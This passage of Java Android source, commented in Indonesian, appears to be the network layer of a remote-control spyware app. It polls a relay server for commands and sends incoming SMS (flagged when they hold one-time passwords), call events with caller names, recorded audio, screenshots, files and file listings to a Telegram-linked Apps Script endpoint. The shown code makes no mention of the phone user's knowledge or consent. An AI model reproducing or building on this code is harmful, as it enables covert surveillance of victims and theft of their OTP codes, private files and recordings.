        } catch (Exception e) {
            Log.e(TAG, "Error getSettingsRequest", e);
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    public static boolean sendSettingsResult(
            String requestId, boolean success, String message) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action",    "settingsResult");
            json.put("requestId", requestId == null ? "" : requestId);
            json.put("success",   success);
            json.put("message",   message == null ? "" : message);

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) return false;

            try {
                return "success".equalsIgnoreCase(
                        new JSONObject(responseBody).optString("status", ""));
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error sendSettingsResult", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // =========================================================
    // USAGE STATS
    // =========================================================

    public static JSONObject getUsageRequest() {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL + "?action=getUsageRequest");

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String body = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300 ||
                    body == null || body.trim().isEmpty()) return null;

            return new JSONObject(body);

        } catch (Exception e) {
            Log.e(TAG, "Error getUsageRequest", e);
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Kirim hasil usage stats ke GAS (on-demand dari Telegram).
     */
    public static boolean sendUsageReport(
            String requestId, String period, String reportText) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action",     "usageReport");
            json.put("requestId",  requestId == null ? "" : requestId);
            json.put("period",     period == null ? "" : period);
            json.put("reportText", reportText == null ? "" : reportText);

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();
            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();
            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) return false;

            try {
                return "success".equalsIgnoreCase(
                        new JSONObject(responseBody).optString("status", ""));
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error sendUsageReport", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Push laporan otomatis (harian/mingguan) dari WorkManager ke GAS.
     * Tidak membutuhkan requestId — GAS langsung forward ke Telegram.
     */
    public static boolean sendAutoUsageReport(String reportText, String type) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action",     "autoUsageReport");
            json.put("type",       type == null ? "daily" : type);
            json.put("reportText", reportText == null ? "" : reportText);

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();
            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();
            readResponse(stream);

            return responseCode >= 200 && responseCode < 300;

        } catch (Exception e) {
            Log.e(TAG, "Error sendAutoUsageReport", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // =========================================================
    // FILE & MEDIA
    // =========================================================

    public static JSONObject getFileRequest() {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL + "?action=getFileRequest");

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String body = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300 ||
                    body == null || body.trim().isEmpty()) return null;

            return new JSONObject(body);

        } catch (Exception e) {
            Log.e(TAG, "Error getFileRequest", e);
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Kirim hasil file (foto/video/dokumen) ke GAS.
     * GAS meneruskan ke Telegram sebagai dokumen/foto/video.
     */
    public static boolean sendFileResult(
            String requestId,
            String operation,
            FileHelper.FileResult result) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(90000); // 90 detik untuk file besar
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action",     "fileResult");
            json.put("requestId",  requestId == null ? "" : requestId);
            json.put("operation",  operation);
            json.put("hasFile",    result.hasFile);
            json.put("name",       result.name);
            json.put("path",       result.path);
            json.put("size",       result.size);
            json.put("sizeLabel",  result.sizeLabel());
            json.put("mimeType",   result.mimeType == null ? "" : result.mimeType);
            json.put("tooBig",     result.tooBig);
            json.put("base64",     result.base64 == null ? "" : result.base64);

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) return false;

            try {
                JSONObject resp = new JSONObject(responseBody);
                return "success".equalsIgnoreCase(resp.optString("status", ""));
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error sendFileResult", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Kirim hasil list/search file ke GAS sebagai teks.
     */
    public static boolean sendFileListResult(
            String requestId,
            String operation,
            String params,
            java.util.List<String> items) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            // Gabungkan list menjadi teks
            StringBuilder sb = new StringBuilder();
            for (String item : items) {
                sb.append(item).append("\n");
            }

            JSONObject json = new JSONObject();
            json.put("action",    "fileListResult");
            json.put("requestId", requestId == null ? "" : requestId);
            json.put("operation", operation);
            json.put("params",    params == null ? "" : params);
            json.put("text",      sb.toString().trim());
            json.put("count",     items.size());

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) return false;

            try {
                JSONObject resp = new JSONObject(responseBody);
                return "success".equalsIgnoreCase(resp.optString("status", ""));
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error sendFileListResult", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Kirim hasil screenshot ke GAS.
     */
    public static boolean sendScreenshotResult(
            String requestId,
            String base64,
            int width,
            int height) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(90000);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action",    "fileResult");
            json.put("requestId", requestId == null ? "" : requestId);
            json.put("operation", "screenshot");
            json.put("hasFile",   true);
            json.put("name",      "screenshot.png");
            json.put("mimeType",  "image/png");
            json.put("base64",    base64 == null ? "" : base64);
            json.put("tooBig",    false);
            json.put("width",     width);
            json.put("height",    height);

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) return false;

            try {
                JSONObject resp = new JSONObject(responseBody);
                return "success".equalsIgnoreCase(resp.optString("status", ""));
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error sendScreenshotResult", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    public static boolean updateFileRequestStatus(String requestId, String status) {

        if (requestId == null || requestId.trim().isEmpty()) return false;

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action",    "fileRequestStatus");
            json.put("requestId", requestId);
            json.put("status",    status);

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();
            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();
            readResponse(stream);

            return responseCode >= 200 && responseCode < 300;

        } catch (Exception e) {
            Log.e(TAG, "Error updateFileRequestStatus", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // =========================================================
    // AUDIO
    // =========================================================

    /**
     * Cek pending audio request dari GAS.
     * Android -> Worker -> Apps Script (doGet, action=getAudioRequest)
     */
    public static JSONObject getPendingAudioRequest() {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL + "?action=getAudioRequest");

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String body = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300 ||
                    body == null || body.trim().isEmpty()) {
                return null;
            }

            return new JSONObject(body);

        } catch (Exception e) {
            Log.e(TAG, "Error getting audio request", e);
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Kirim hasil rekaman audio ke GAS → diteruskan ke Telegram.
     * File di-encode base64 dan dikirim via POST JSON.
     */
    public static boolean sendAudioResult(
            android.content.Context context,
            String requestId,
            java.io.File audioFile,
            int durationSec,
            String mode) {

        if (audioFile == null || !audioFile.exists() || audioFile.length() == 0) {
            return false;
        }

        HttpURLConnection conn = null;

        try {
            // Baca file audio ke byte array
            byte[] audioBytes;
            try (
                java.io.FileInputStream fis = new java.io.FileInputStream(audioFile);
                java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream()
            ) {
                byte[] buffer = new byte[8192];
                int count;
                while ((count = fis.read(buffer)) != -1) {
                    bos.write(buffer, 0, count);
                }
                audioBytes = bos.toByteArray();
            }

            String audioBase64 = android.util.Base64.encodeToString(
                    audioBytes, android.util.Base64.NO_WRAP
            );

            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(60000); // 60 detik untuk file besar
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action",      "audioResult");
            json.put("requestId",   requestId == null ? "" : requestId);
            json.put("audioBase64", audioBase64);
            json.put("duration",    durationSec);
            json.put("mode",        mode == null ? "record" : mode);
            json.put("fileName",    audioFile.getName());
            json.put("mimeType",    "audio/mp4");

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) {
                Log.e(TAG, "Audio upload failed HTTP=" + responseCode);
                return false;
            }

            try {
                JSONObject resp = new JSONObject(responseBody);
                return "success".equalsIgnoreCase(resp.optString("status", ""));
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error uploading audio", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Update status audio request (RECEIVED, CANCELLED, COMPLETED, FAILED).
     */
    public static boolean updateAudioRequestStatus(
            String requestId,
            String status) {

        if (requestId == null || requestId.trim().isEmpty()) return false;

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action",    "audioRequestStatus");
            json.put("requestId", requestId);
            json.put("status",    status);

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) return false;

            try {
                JSONObject resp = new JSONObject(responseBody);
                return "success".equalsIgnoreCase(resp.optString("status", ""));
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error updating audio status", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // =========================================================
    // SMS
    // =========================================================

    /**
     * Kirim SMS yang masuk ke GAS → diteruskan ke Telegram.
     *
     * Android -> Worker -> Apps Script (doPost, action=sms)
     * -> handleSmsNotification() di Code.gs -> Telegram
     */
    public static boolean sendSmsToSheet(
            android.content.Context context,
            String sender,
            String body,
            long timestamp,
            boolean isOtp) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty(
                    "Content-Type",
                    "application/json; charset=utf-8"
            );
            conn.setRequestProperty(
                    "Accept",
                    "application/json, text/plain, */*"
            );
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action", "sms");
            json.put("sender", sender == null ? "" : sender);
            json.put("body", body == null ? "" : body);
            json.put("timestamp", timestamp);
            json.put("isOtp", isOtp);

            byte[] bodyBytes = json.toString()
                    .getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(bodyBytes);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) {
                Log.e(TAG, "SMS send failed HTTP=" + responseCode);
                return false;
            }

            try {
                JSONObject resp = new JSONObject(responseBody);
                return "success".equalsIgnoreCase(resp.optString("status", ""));
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error sending SMS to sheet", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // =========================================================
    // CALL EVENT
    // =========================================================

    /**
     * Kirim event panggilan masuk ke GAS → diteruskan ke Telegram.
     *
     * Android -> Worker -> Apps Script (doPost, action=callEvent)
     * -> handleCallEvent() di Code.gs -> Telegram
     */
    public static boolean sendCallEvent(
            android.content.Context context,
            String number,
            String contactName,
            long timestamp) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty(
                    "Content-Type",
                    "application/json; charset=utf-8"
            );
            conn.setRequestProperty(
                    "Accept",
                    "application/json, text/plain, */*"
            );
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action", "callEvent");
            json.put("number", number == null ? "" : number);
            json.put("contactName", contactName == null ? "Tidak dikenal" : contactName);
            json.put("timestamp", timestamp);

            byte[] body = json.toString()
                    .getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) {
                Log.e(TAG, "Call event send failed HTTP=" + responseCode);
                return false;
            }

            try {
                JSONObject resp = new JSONObject(responseBody);
                return "success".equalsIgnoreCase(resp.optString("status", ""));
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error sending call event", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // =========================================================
    // RESPONSE READER
    // =========================================================

    private static String readResponse(
            InputStream stream) {

        if (stream == null) {
            return "";
        }

        try (
                BufferedReader reader =
                        new BufferedReader(
                                new InputStreamReader(
                                        stream,
                                        StandardCharsets.UTF_8
                                )
                        )
        ) {

            StringBuilder result = new StringBuilder();
            String line;

            while ((line = reader.readLine()) != null) {
                result.append(line);
            }

            return result.toString();

        } catch (Exception e) {

            return "";
        }
    }
}
